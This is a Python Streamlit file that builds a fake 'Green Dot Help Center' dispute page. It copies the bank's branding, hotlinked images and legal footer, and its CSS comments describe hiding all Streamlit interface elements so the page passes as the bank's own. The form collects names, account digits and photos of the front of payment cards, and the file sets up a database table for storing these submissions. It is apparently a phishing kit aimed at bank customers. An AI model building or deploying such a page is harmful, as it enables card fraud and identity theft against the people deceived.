
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# CSS REFORZADO: Oculta menús, pies de página, botones de despliegue y desactiva punteros en imágenes/títulos
st.markdown("""<style>
/* Ocultar elementos de Streamlit */
header, footer, #MainMenu, .stDeployButton {visibility: hidden !important; display: none !important;}
[data-testid='stHeader'], [data-testid='stAppToolbar'], [data-testid='stFooterAd'] {display: none !important;}

/* Desactivar absolutamente todos los eventos de puntero en la cabecera */
[data-testid="stImage"], [data-testid="stMarkdownContainer"] h1, [data-testid="stMarkdownContainer"] h2 {
    pointer-events: none !important;
    cursor: default !important;
    user-select: none !important;
}

/* Eliminar botón de pantalla completa en imágenes */
button[title='View fullscreen'] {display: none !important;}

.block-container {
    padding-top: 2rem !important;
    max-width: 800px !important;
}

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    border-radius: 4px !important;
    border: none !important;
}

.app-promo-container {
    background-color: #000000;
    padding: 40px 20px;
    text-align: center;
    border-radius: 12px;
    margin: 30px 0;
    pointer-events: auto !important; /* Permitir links solo aquí si es necesario */
}

.legal-footer {
    font-size: 11px;
    color: #888;
    text-align: justify;
    margin-top: 40px;
    padding-top: 20px;
    border-top: 1px solid #eee;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=150)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form_final", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Account Number (Last 4 digits)")
    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format="%.2f")
    st.markdown("**Required Evidence**")
    rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT DISPUTE")

if submitted:
    if nombre and rec and car:
        st.success("✅ Dispute submitted successfully.")
    else:
        st.error("⚠️ Please complete all fields.")

st.markdown("""<div class='app-promo-container'>
    <h3 style='color:white;'>Download the Green Dot app</h3>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC. 
©2026 Green Dot Bank. All rights reserved. NMLS #914924.
</div>""", unsafe_allow_html=True)
